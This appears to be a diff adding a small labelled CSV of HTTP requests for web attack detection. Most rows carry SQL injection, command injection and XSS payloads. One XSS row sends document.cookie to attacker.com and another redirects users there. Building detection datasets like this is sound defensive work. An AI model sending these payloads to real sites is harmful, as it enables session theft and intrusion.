@@ -1,0 +1,11 @@
+﻿ID,Method,URL,Headers,Body,Payload_type,Malicious,Notes,Desciption
+1,GET,/search?query=1%27%20OR%201=1--,User-Agent: Mozilla/5.0,,SQL injection,1,High risk,1=1
+2,GET,/search?query=1' OR 1=1,,,SQL injection,1,High risk,1=1
+3,GET,/execute?cmd=ls%20-la,,,Command injection,1,High risk,la -la
+4,GET,/profile?user=<script>fetch('http://attacker.com/cookie?cookie=' + document.cookie)</script>,,,DOM-based XSS,1,High risk,Modify client code Dom element
+5,POST,/submit,Content-Type: application/x-www-form-urlencoded,name=<script>alert('XSS')</script>,XSS,1,High risk,Change Dom element
+6,GET,/home,User-Agent: Mozilla/5.0,,Safe,0,Normal access,
+7,POST,/login,Content-Type: application/x-www-form-urlencoded,username=admin&password=1234,Safe,0,Normal login,
+8,GET ,/login?redirect=<script>document.location='http://attacker.com'</script>,,,URL Manipulation,1,High risk,Hacker create URL leading user to bad site
+9,POST,/register,"Host: example.com
+Content-Type: application/x-www-form-urlencoded",username=<script>alert('XSS')</script>&password=12345,Script Injection via Form Fields,1,High risk,"If a form accepts input without validation, an attacker can inject a script"
